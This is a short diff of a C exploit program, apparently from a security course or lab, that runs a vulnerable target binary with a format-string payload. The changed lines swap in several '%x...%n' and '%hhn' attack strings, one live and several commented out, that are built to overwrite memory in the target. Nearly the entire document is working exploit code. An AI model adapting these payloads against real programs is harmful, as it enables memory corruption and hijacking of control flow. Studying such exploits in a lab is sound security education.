@@ -83,9 +83,10 @@ int main(void)
   args[0] = TARGET; 
   args[1] = s;
   args[2] = NULL;
-  char* r = "%08x%08x%08x%08x%78u%hhn%97u%hhn%171u%hhn%156u%hhn";
-  //char* r = "%08x%08x%08x%08x%78u";
-  //char* r = "%111x";
+  //char* r = "%x%x%x%x%93x%hhn%97x%hhn%171x%hhn%156x%hhn";
+  //char* r = "%1$16u%2$n";1084553624
+  char* r = "%x%x%x%x%1084553558x%n";
+  //char* r = "%x%x%x%x%93x%hhn%95x%hhn%169x%hhn%154x%hhn";
   //char* r = "%08x.%08x.%08x.%08x.%08x.%n.%08x.%08x.%08.%08x.%08x.%08x.%08x.%08x\n";
   env[0] = "\x00";
   env[1] = "\x00";
